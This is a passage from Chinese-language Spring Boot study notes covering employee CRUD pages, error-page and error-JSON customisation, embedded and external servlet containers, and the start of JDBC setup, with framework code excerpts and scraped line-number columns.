}\n   \n   @PostMapping("/emp")\n   public String save(Employee employee){\n       employeeDao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   \n   \n   提交时如果出现400错误说明类型转化出现了问题，默认按照yyyy/MM/dd进行格式化。\n   \n   \n\n@Bean\n@ConditionalOnProperty(prefix = "spring.mvc", name = "date-format")\npublic Formatter<Date> dateFormatter() {\n    return new DateFormatter(this.mvcProperties.getDateFormat());\n}\n\npublic String getDateFormat() {\n    return this.dateFormat;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n需要在配置文件中配置格式化日期的格式：spring.mvc.date-format: yyyy-MM-dd\n\n * 员工修改页面\n   \n   <a class="btn btn-sm btn-primary" th:href="@{/emp/}+${emp.id}">修改</a>\n   \n   \n   \n   1\n   2\n   \n   \n   因为员工修改页面和员工添加页面组成类似，因此可以复用一个页面。\n   \n   /**\n        * 来到update页面\n        * @param id\n        * @return\n        */\n   @GetMapping("/emp/{id}")\n   public String update(@PathVariable("id")Integer id,Model model){\n       Collection<Department> departments = departmentDao.getDepartments();\n       model.addAttribute("depts",departments);\n       Employee employee = employeeDao.get(id);\n       model.addAttribute("emp",employee);\n       return "emp/add";\n   }\n   \n   @PutMapping("/emp")\n   public String update(Employee employee){\n       employeeDao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   \n   \n   注意： 提交put请求时，需要配置httphiddenmethodfilter，并且隐藏input框name为"_method"，value为提交方法。\n\n * 删除员工信息\n   \n   页面添加删除表单。下面的这种添加方式会影响页面的布局\n   \n   <form th:action="@{/emp}+${emp.id}" method="post">\n       <input type="hidden" name="_method" value="delete">\n       <button class="btn btn-sm btn-danger" type="submit">删除</button>\n   </form>\n   \n   \n   1\n   2\n   3\n   4\n   \n\n最好是改成下面的方式：\n\n<button th:attr="del_uri=@{/emp/}+${emp.id}" class="btn btn-sm btn-danger deleteBtn">删除</button>\n\n\n<form id="deleteEmpForm"  method="post">\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n<script>\n\t$(".deleteBtn").click(function(){\n\t\t//删除当前员工的\n\t\t$("#deleteEmpForm").attr("action",$(this).attr("del_uri")).submit();\n\t\treturn false;\n\t});\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# spring 错误处理机制\n\n# 错误机制原理\n\nSpringboot在出错时（客户端、服务器）都会返回一个默认的页面或者默认的json数据。主要是由MvcErrorAutoConfiguration进行自动配置的。我们需要定制返回的数据和页面。\n\nMvcErrorAutoConfiguration给容器中添加了以下的组件：\n\n * DefaultErrorAttributes\n   \n   // 帮我们在页面获取信息\n       @Override\n   public Map<String, Object> getErrorAttributes(RequestAttributes requestAttributes,\n                                                 boolean includeStackTrace) {\n       Map<String, Object> errorAttributes = new LinkedHashMap<String, Object>();\n       errorAttributes.put("timestamp", new Date());\n       addStatus(errorAttributes, requestAttributes);\n       addErrorDetails(errorAttributes, requestAttributes, includeStackTrace);\n       addPath(errorAttributes, requestAttributes);\n       return errorAttributes;\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n * BasicErrorController\n   \n   @Controller\n   @RequestMapping("${server.error.path:${error.path:/error}}")\n   public class BasicErrorController extends AbstractErrorController {\n       @RequestMapping(produces = "text/html")//产生html类型的数据；浏览器发送的请求来到这个方法处理\n       public ModelAndView errorHtml(HttpServletRequest request,\n                                     HttpServletResponse response) {\n           HttpStatus status = getStatus(request);\n           Map<String, Object> model = Collections.unmodifiableMap(getErrorAttributes(\n               request, isIncludeStackTrace(request, MediaType.TEXT_HTML)));\n           response.setStatus(status.value());\n           //去哪个页面作为错误页面；包含页面地址和页面内容\n           ModelAndView modelAndView = resolveErrorView(request, response, status, model);\n           return (modelAndView == null ? new ModelAndView("error", model) : modelAndView);\n       }\n       @RequestMapping\n       @ResponseBody //产生json数据，其他客户端来到这个方法处理；\n       public ResponseEntity<Map<String, Object>> error(HttpServletRequest request) {\n           Map<String, Object> body = getErrorAttributes(request,\n                                                         isIncludeStackTrace(request, MediaType.ALL));\n           HttpStatus status = getStatus(request);\n           return new ResponseEntity<Map<String, Object>>(body, status);\n       }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   \n\n * ErrorPageCustomizer\n   \n   @Value("${error.path:/error}")\n   private String path = "/error"; 系统出现错误以后来到error请求进行处理；（web.xml注册的错误页\n       面规则）\n   \n   \n   1\n   2\n   3\n   \n\n * DefaultErrorViewResolver\n   \n   @Override\n   public ModelAndView resolveErrorView(HttpServletRequest request, HttpStatus status,\n                                        Map<String, Object> model) {\n       ModelAndView modelAndView = resolve(String.valueOf(status), model);\n       if (modelAndView == null && SERIES_VIEWS.containsKey(status.series())) {\n           modelAndView = resolve(SERIES_VIEWS.get(status.series()), model);\n       }\n       return modelAndView;\n   }\n   private ModelAndView resolve(String viewName, Map<String, Object> model) {\n       //默认SpringBoot可以去找到一个页面？ error/404\n       String errorViewName = "error/" + viewName;\n       //模板引擎可以解析这个页面地址就用模板引擎解析\n       TemplateAvailabilityProvider provider = this.templateAvailabilityProviders\n           .getProvider(errorViewName, this.applicationContext);\n       if (provider != null) {\n           //模板引擎可用的情况下返回到errorViewName指定的视图地址\n           return new ModelAndView(errorViewName, model);\n       }\n       //模板引擎不可用，就在静态资源文件夹下找errorViewName对应的页面 error/404.html\n       return resolveResource(errorViewName, model);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   \n\n一但系统出现4xx或者5xx之类的错误，ErrorPageCustomizer就会生效（定制错误的响应规则），就会来到/error请求；就会被BasicErrorController处理。\n\n关于响应页面，去哪个页面是由DefaultErrorViewResolver解析得到的。\n\nprotected ModelAndView resolveErrorView(HttpServletRequest request,\n                                        HttpServletResponse response, HttpStatus status, Map<String, Object> model) {\n    //所有的ErrorViewResolver得到ModelAndView\n    for (ErrorViewResolver resolver : this.errorViewResolvers) {\n        ModelAndView modelAndView = resolver.resolveErrorView(request, status, model);\n        if (modelAndView != null) {\n            return modelAndView;\n        }\n    }\n    return null;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 定制错误页面\n\n有模板引擎的情况下，将错误页面命名为错误状态码.html，放在模板引擎文件夹里面的error文件夹下。我们可以使用4xx和5xx作为错误页面的文件名来匹配这种类型的所有错误，精确优先（优先寻找精确的状态码.html）。\n\n没有模板引擎（模板引擎找不到这个错误页面），静态资源文件夹下找，静态资源文件夹下的不会被模板引擎解析 。以上都没有错误页面，就是默认来到SpringBoot默认的错误提示页面。\n\n我们能在页面获取的信息是：\n\n * timestamp：时间戳\n * status：状态码\n * error：错误提示\n * exception：异常对象\n * message：异常消息\n * errors：JSR303数据校验的错误\n\n# 定制错误的json数据\n\n 1. 自定义异常处理器\n    \n    package com.pwddd.springboot.exception;\n    \n    import org.springframework.web.bind.annotation.ControllerAdvice;\n    import org.springframework.web.bind.annotation.ExceptionHandler;\n    import org.springframework.web.bind.annotation.ResponseBody;\n    \n    import java.util.HashMap;\n    import java.util.Map;\n    \n    @ControllerAdvice\n    public class MyExceptionHandler {\n    \n        @ResponseBody\n        @ExceptionHandler(UserNotExistException.class)\n        public Map<String,Object> handleException(Exception e){\n            HashMap<String, Object> map = new HashMap<>();\n            map.put("code",404);\n            map.put("msg","用户不存在");\n            return map;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 2. 以上的代码虽然可以返回json数据，但是，浏览器访问也返回json数据。我们需要转发到error上，完成自适应处理器\n    \n    @ExceptionHandler(UserNotExistException.class)\n    public String handleException(Exception e){\n        HashMap<String, Object> map = new HashMap<>();\n        map.put("code",404);\n        map.put("msg","用户不存在");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. 转到error之后，因为我们的错误状态码问题，导致没有对应的错误页面，因此显示还是默认的空白页。我们需要传入默认的状态码\n    \n    @ExceptionHandler(UserNotExistException.class)\n    public String handleException(Exception e, HttpServletRequest request){\n        HashMap<String, Object> map = new HashMap<>();\n        request.setAttribute("javax.servlet.error.status_code",400);\n        map.put("code",404);\n        map.put("msg","用户不存在");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 4. 我们定制的数据这样携带不出去，我们需要将定制的数据携带出去。相应的数据是由getErrorAttributes获取的。我们想要定制的话，我们可以完全编写一个实现类，完全替代。但是这样太麻烦了，我们可以继承并重写相应的方法。页面上能用的数据，或者是json返回能用的数据都是通过errorAttributes.getErrorAttributes得到。容器中DefaultErrorAttributes.getErrorAttributes()默认进行数据处理的\n    \n    //给容器中加入我们自己定义的ErrorAttributes\n    @Component\n    public class MyErrorAttributes extends DefaultErrorAttributes {\n        @Override\n        public Map<String, Object> getErrorAttributes(RequestAttributes requestAttributes,\n                                                      boolean includeStackTrace) {\n            Map<String, Object> map = super.getErrorAttributes(requestAttributes,\n                                                               includeStackTrace);\n            //requestAttributes.getAttributes("ext",0);   // 获取异常处理器的数据。\n            map.put("company","atguigu");\n            return map;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    \n    \n    最终的效果：响应是自适应的，可以通过定制ErrorAttributes改变需要返回的内容。\n\n\n# 嵌入式Web容器\n\nSpringBoot默认使用Tomcat作为嵌入式的Servlet容器。我们需要考虑，定制配置、切换其他的容器。\n\n\n\n# 定制tomcat配置\n\n 1. 修改和server有关的配置（ServerProperties【也是EmbeddedServletContainerCustomizer】）。\n\nerver.port=8081\nserver.context‐path=/crud\nserver.tomcat.uri‐encoding=UTF‐8\n//通用的Servlet容器设置\nserver.xxx\n//Tomcat的设置\nserver.tomcat.xxx\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. 编写一个EmbeddedServletContainerCustomizer：嵌入式的Servlet容器的定制器，来修改Servlet容器的配置\n\n@Bean //一定要将这个定制器加入到容器中\npublic EmbeddedServletContainerCustomizer embeddedServletContainerCustomizer(){\n    return new EmbeddedServletContainerCustomizer() {\n        //定制嵌入式的Servlet容器相关的规则\n        @Override\n        public void customize(ConfigurableEmbeddedServletContainer container) {\n            container.setPort(8083);\n        }\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 注册Servlet三大组件【Servlet、Filter、Listener】\n\nServlet:\n\n//注册三大组件\n@Bean\npublic ServletRegistrationBean myServlet(){\n    ServletRegistrationBean registrationBean = new ServletRegistrationBean(new\n                                                                           MyServlet(),"/myServlet");\n    return registrationBean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nFilter:\n\n@Bean\npublic FilterRegistrationBean myFilter(){\n    FilterRegistrationBean registrationBean = new FilterRegistrationBean();\n    registrationBean.setFilter(new MyFilter());\n    registrationBean.setUrlPatterns(Arrays.asList("/hello","/myServlet"));\n    return registrationBean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nListener:\n\n@Bean\npublic ServletListenerRegistrationBean myListener(){\n    ServletListenerRegistrationBean<MyListener> registrationBean = new\n        ServletListenerRegistrationBean<>(new MyListener());\n    return registrationBean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nSpringBoot帮我们自动SpringMVC的时候，自动的注册SpringMVC的前端控制器。DIspatcherServlet。\n\nDispatcherServletAutoConfiguration：\n\n@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)\n@ConditionalOnBean(value = DispatcherServlet.class, name =\n                   DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)\npublic ServletRegistrationBean dispatcherServletRegistration(\n    DispatcherServlet dispatcherServlet) {\n    ServletRegistrationBean registration = new ServletRegistrationBean(\n        dispatcherServlet, this.serverProperties.getServletMapping());\n    //默认拦截： / 所有请求；包静态资源，但是不拦截jsp请求； /*会拦截jsp\n    //可以通过server.servletPath来修改SpringMVC前端控制器默认拦截的请求路径\n    registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);\n    registration.setLoadOnStartup(\n        this.webMvcProperties.getServlet().getLoadOnStartup());\n    if (this.multipartConfig != null) {\n        registration.setMultipartConfig(this.multipartConfig);\n    }\n    return registration;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 替换其他容器\n\nTomcat默认支持：\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter‐web</artifactId>\n    引入web模块默认就是使用嵌入式的Tomcat作为Servlet容器；\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nJetty:\n\n<!‐‐ 引入web模块 ‐‐>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter‐web</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>spring‐boot‐starter‐tomcat</artifactId>\n            <groupId>org.springframework.boot</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!‐‐引入其他的Servlet容器‐‐>\n<dependency>\n    <artifactId>spring‐boot‐starter‐jetty</artifactId>\n    <groupId>org.springframework.boot</groupId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nUndertow：\n\n<!‐‐ 引入web模块 ‐‐>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring‐boot‐starter‐web</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>spring‐boot‐starter‐tomcat</artifactId>\n            <groupId>org.springframework.boot</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!‐‐引入其他的Servlet容器‐‐>\n<dependency>\n    <artifactId>spring‐boot‐starter‐undertow</artifactId>\n    <groupId>org.springframework.boot</groupId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 自动配置原理\n\nEmbeddedServletContainerAutoConfiguration：嵌入式的Servlet容器自动配置\n\n@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)\n@Configuration\n@ConditionalOnWebApplication\n@Import(BeanPostProcessorsRegistrar.class)\n//导入BeanPostProcessorsRegistrar：Spring注解版；给容器中导入一些组件\n//导入了EmbeddedServletContainerCustomizerBeanPostProcessor：\n//后置处理器：bean初始化前后（创建完对象，还没赋值赋值）执行初始化工作\npublic class EmbeddedServletContainerAutoConfiguration {\n    @Configuration\n    @ConditionalOnClass({ Servlet.class, Tomcat.class })//判断当前是否引入了Tomcat依赖；\n    @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search =\n                              SearchStrategy.CURRENT)//判断当前容器没有用户自己定义EmbeddedServletContainerFactory：嵌入式的\n    Servlet容器工厂；作用：创建嵌入式的Servlet容器\n        public static class EmbeddedTomcat {\n            @Bean\n            public TomcatEmbeddedServletContainerFactory tomcatEmbeddedServletContainerFactory()\n            {\n                return new TomcatEmbeddedServletContainerFactory();\n            }\n        }\n    /**\n* Nested configuration if Jetty is being used.\n*/\n    @Configuration\n    @ConditionalOnClass({ Servlet.class, Server.class, Loader.class,\n                         WebAppContext.class })\n    @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search =\n                              SearchStrategy.CURRENT)\n    public static class EmbeddedJetty {\n        @Bean\n        public JettyEmbeddedServletContainerFactory jettyEmbeddedServletContainerFactory() {\n            return new JettyEmbeddedServletContainerFactory();\n        }\n    }\n    /**\n* Nested configuration if Undertow is being used.\n*/\n    @Configuration\n    @ConditionalOnClass({ Servlet.class, Undertow.class, SslClientAuthMode.class })\n    @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search =\n                              SearchStrategy.CURRENT)\n    public static class EmbeddedUndertow {\n        @Bean\n        public UndertowEmbeddedServletContainerFactory\n            undertowEmbeddedServletContainerFactory() {\n            return new UndertowEmbeddedServletContainerFactory();\n        }\n    }\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\nEmbeddedServletContainerFactory嵌入式Servlet容器工厂\n\npublic interface EmbeddedServletContainerFactory {\n    //获取嵌入式的Servlet容器\n    EmbeddedServletContainer getEmbeddedServletContainer(\n        ServletContextInitializer... initializers);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n嵌入式的容器工厂：\n\n\n\n嵌入式的容器：\n\n\n\n@Override\npublic EmbeddedServletContainer getEmbeddedServletContainer(\n    ServletContextInitializer... initializers) {\n    //创建一个Tomcat\n    Tomcat tomcat = new Tomcat();\n    //配置Tomcat的基本环节\n    File baseDir = (this.baseDirectory != null ? this.baseDirectory\n                    : createTempDir("tomcat"));\n    tomcat.setBaseDir(baseDir.getAbsolutePath());\n    Connector connector = new Connector(this.protocol);\n    tomcat.getService().addConnector(connector);\n    customizeConnector(connector);\n    tomcat.setConnector(connector);\n    tomcat.getHost().setAutoDeploy(false);\n    configureEngine(tomcat.getEngine());\n    for (Connector additionalConnector : this.additionalTomcatConnectors) {\n        tomcat.getService().addConnector(additionalConnector);\n    }\n    prepareContext(tomcat.getHost(), initializers);\n    //将配置好的Tomcat传入进去，返回一个EmbeddedServletContainer；并且启动Tomcat服务器\n    return getTomcatEmbeddedServletContainer(tomcat);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nEmbeddedServletContainerCustomizer定制器帮我们修改了Servlet容器的配置。\n\n容器中导入了EmbeddedServletContainerCustomizerBeanPostProcessor。\n\n//初始化之前\n@Override\npublic Object postProcessBeforeInitialization(Object bean, String beanName)\n    throws BeansException {\n    //如果当前初始化的是一个ConfigurableEmbeddedServletContainer类型的组件\n    if (bean instanceof ConfigurableEmbeddedServletContainer) {\n        //\n        postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean);\n    }\n    return bean;\n}\nprivate void postProcessBeforeInitialization(\n    ConfigurableEmbeddedServletContainer bean) {\n    //获取所有的定制器，调用每一个定制器的customize方法来给Servlet容器进行属性赋值；\n    for (EmbeddedServletContainerCustomizer customizer : getCustomizers()) {\n        customizer.customize(bean);\n    }\n}\nprivate Collection<EmbeddedServletContainerCustomizer> getCustomizers() {\n    if (this.customizers == null) {\n        // Look up does not include the parent context\n        this.customizers = new ArrayList<EmbeddedServletContainerCustomizer>(\n            this.beanFactory\n            //从容器中获取所有这葛类型的组件：EmbeddedServletContainerCustomizer\n            //定制Servlet容器，给容器中可以添加一个EmbeddedServletContainerCustomizer类型的组件\n            .getBeansOfType(EmbeddedServletContainerCustomizer.class,\n                            false, false)\n            .values());\n        Collections.sort(this.customizers, AnnotationAwareOrderComparator.INSTANCE);\n        this.customizers = Collections.unmodifiableList(this.customizers);\n    }\n    return this.customizers;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n1）、SpringBoot根据导入的依赖情况，给容器中添加相应的 EmbeddedServletContainerFactory【TomcatEmbeddedServletContainerFactory】\n\n2）、容器中某个组件要创建对象就会惊动后置处理器。EmbeddedServletContainerCustomizerBeanPostProcessor。只要是嵌入式的Servlet容器工厂，后置处理器就工作。\n\n3）、后置处理器，从容器中获取所有的EmbeddedServletContainerCustomizer，调用定制器的定制方法\n\n\n# 嵌入式Servlet容器启动原理\n\n什么时候创建嵌入式的Servlet容器工厂？什么时候获取嵌入式的Servlet容器并启动Tomcat？获取嵌入式的Servlet容器工厂：\n\n 1. SpringBoot应用启动运行run方法\n 2. refreshContext(context)。SpringBoot刷新IOC容器【创建IOC容器对象，并初始化容器，创建容器中的每一 个组件】。如果是web应用创建AnnotationConfigEmbeddedWebApplicationContext，否则： AnnotationConfigApplicationContext\n 3. refresh(context)。刷新刚才创建好的ioc容器。\n\npublic void refresh() throws BeansException, IllegalStateException {\n    synchronized (this.startupShutdownMonitor) {\n        // Prepare this context for refreshing.\n        prepareRefresh();\n        // Tell the subclass to refresh the internal bean factory.\n        ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n        // Prepare the bean factory for use in this context.\n        prepareBeanFactory(beanFactory);\n        try {\n            // Allows post‐processing of the bean factory in context subclasses.\n            postProcessBeanFactory(beanFactory);\n            // Invoke factory processors registered as beans in the context.\n            invokeBeanFactoryPostProcessors(beanFactory);\n            // Register bean processors that intercept bean creation.\n            registerBeanPostProcessors(beanFactory);\n            // Initialize message source for this context.\n            initMessageSource();\n            // Initialize event multicaster for this context.\n            initApplicationEventMulticaster();\n            // Initialize other special beans in specific context subclasses.\n            onRefresh();\n            // Check for listener beans and register them.\n            registerListeners();\n            // Instantiate all remaining (non‐lazy‐init) singletons.\n            finishBeanFactoryInitialization(beanFactory);\n            // Last step: publish corresponding event.\n            finishRefresh();\n        }\n        catch (BeansException ex) {\n            if (logger.isWarnEnabled()) {\n                logger.warn("Exception encountered during context initialization ‐ " +\n                            "cancelling refresh attempt: " + ex);\n            }\n            // Destroy already created singletons to avoid dangling resources.\n            destroyBeans();\n            // Reset \'active\' flag.\n            cancelRefresh(ex);\n            // Propagate exception to caller.\n            throw ex;\n        }\n        finally {\n            // Reset common introspection caches in Spring\'s core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetCommonCaches();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n 4. onRefresh()。web的ioc容器重写了onRefresh方法\n\n 5. webioc容器会创建嵌入式的Servlet容器。createEmbeddedServletContainer()。\n\n 6. 获取嵌入式的Servlet容器工厂\n    \n    EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory(); 从ioc容器中获取EmbeddedServletContainerFactory组件。TomcatEmbeddedServletContainerFactory创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制Servlet容器的相关配置。\n\n 7. 使用容器工厂获取嵌入式的Servlet容器：this.embeddedServletContainer = containerFactory .getEmbeddedServletContainer(getSelfInitializer());\n\n 8. 嵌入式的Servlet容器创建对象并启动Servlet容器\n\n 9. 先启动嵌入式的Servlet容器，再将ioc容器中剩下没有创建出的对象获取出来。\n\n\n# 使用外置的Servlet容器\n\n 1. 必须创建一个war项目\n\n 2. 将嵌入式的Tomcat指定为provided\n    \n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring‐boot‐starter‐tomcat</artifactId>\n        <scope>provided</scope>\n    </dependency>\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 3. 必须编写一个SpringBootServletInitializer的子类，并调用configure方法\n    \n    public class ServletInitializer extends SpringBootServletInitializer {\n        @Override\n        protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {\n            //传入SpringBoot应用的主程序\n            return application.sources(SpringBoot04WebJspApplication.class);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. 启动服务器就可以使用\n\n\n# 外置Servlet原理\n\njar包：执行SpringBoot主类的main方法，启动ioc容器，创建嵌入式的Servlet容器\n\nwar包：启动服务器，服务器启动SpringBoot应用【SpringBootServletInitializer】，启动ioc容器\n\n规则：\n\n1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面ServletContainerInitializer实例\n\n2）、ServletContainerInitializer的实现放在jar包的META-INF/services文件夹下，有一个名为javax.servlet.ServletContainerInitializer的文件，内容就是ServletContainerInitializer的实现类的全类名\n\n3）、还可以使用@HandlesTypes，在应用启动的时候加载我们感兴趣的类；\n\n流程：\n\n1）、启动Tomcat\n\n2）、org\\springframework\\spring-web\\4.3.14.RELEASE\\spring-web-4.3.14.RELEASE.jar!\\METAINF\\services\\javax.servlet.ServletContainerInitializer：\n\nSpring的web模块里面有这个文件：org.springframework.web.SpringServletContainerInitializer\n\n3）、`SpringServletContainerInitializer`将`@HandlesTypes(WebApplicationInitializer.class)`标注的所有这个类型 的类都传入到onStartup方法的`<Set>`，为这些`WebApplicationInitializer`类型的类创建实例\n\n\n4）、每一个WebApplicationInitializer都调用自己的onStartup。相当于我们的SpringBootServletInitializer的类会被创建对象，并执行onStartup方法。\n\n6）、SpringBootServletInitializer实例执行onStartup的时候会createRootApplicationContext创建容器\n\nprotected WebApplicationContext createRootApplicationContext(\n    ServletContext servletContext) {\n    //1、创建SpringApplicationBuilder\n    SpringApplicationBuilder builder = createSpringApplicationBuilder();\n    StandardServletEnvironment environment = new StandardServletEnvironment();\n    environment.initPropertySources(servletContext, null);\n    builder.environment(environment);\n    builder.main(getClass());\n    ApplicationContext parent = getExistingRootWebApplicationContext(servletContext);\n    if (parent != null) {\n        this.logger.info("Root context already created (using as parent).");\n        servletContext.setAttribute(\n            WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, null);\n        builder.initializers(new ParentContextApplicationContextInitializer(parent));\n    }\n    builder.initializers(\n        new ServletContextApplicationContextInitializer(servletContext));\n    builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext.class);\n    //调用configure方法，子类重写了这个方法，将SpringBoot的主程序类传入了进来\n    builder = configure(builder);\n    //使用builder创建一个Spring应用\n    SpringApplication application = builder.build();\n    if (application.getSources().isEmpty() && AnnotationUtils\n        .findAnnotation(getClass(), Configuration.class) != null) {\n        application.getSources().add(getClass());\n    }\n    Assert.state(!application.getSources().isEmpty(),\n                 "No SpringApplication sources have been defined. Either override the "\n                 + "configure method or add an @Configuration annotation");\n    // Ensure error pages are registered\n    if (this.registerErrorPageFilter) {\n        application.getSources().add(ErrorPageFilterConfiguration.class);\n    }\n    //启动Spring应用\n    return run(application);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n7）、Spring的应用就启动并且创建IOC容器\n\npublic ConfigurableApplicationContext run(String... args) {\n    StopWatch stopWatch = new StopWatch();\n    stopWatch.start();\n    ConfigurableApplicationContext context = null;\n    FailureAnalyzers analyzers = null;\n    configureHeadlessProperty();\n    SpringApplicationRunListeners listeners = getRunListeners(args);\n    listeners.starting();\n    try {\n        ApplicationArguments applicationArguments = new DefaultApplicationArguments(\n            args);\n        ConfigurableEnvironment environment = prepareEnvironment(listeners,\n                                                                 applicationArguments);\n        Banner printedBanner = printBanner(environment);\n        context = createApplicationContext();\n        analyzers = new FailureAnalyzers(context);\n        prepareContext(context, environment, listeners, applicationArguments,\n                       printedBanner);\n        //刷新IOC容器\n        refreshContext(context);\n        afterRefresh(context, applicationArguments);\n        listeners.finished(context, null);\n        stopWatch.stop();\n        if (this.logStartupInfo) {\n            new StartupInfoLogger(this.mainApplicationClass)\n                .logStarted(getApplicationLog(), stopWatch);\n        }\n        return context;\n    }\n    catch (Throwable ex) {\n        handleRunFailure(context, listeners, analyzers, ex);\n        throw new IllegalStateException(ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Springboot数据交互\n\n\n# JDBC\n\n添加依赖：\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-jdbc</artifactId>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n配置配置文件\n\n# 此处如果切换为高版本的mysql驱动 需要更换为cj下的Driver\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver  \n\n# 如果因为驱动版本小于数据库的版本可能会导致连接问题。加上参数useSSL=false可以解决，建议更换版本。\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n添加测试依赖：\n\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n  </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n配置启动器，如果不配置，测试启动会报错。\n\npackage com.pwddd.jdbc;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\n@SpringBootApplication\npublic 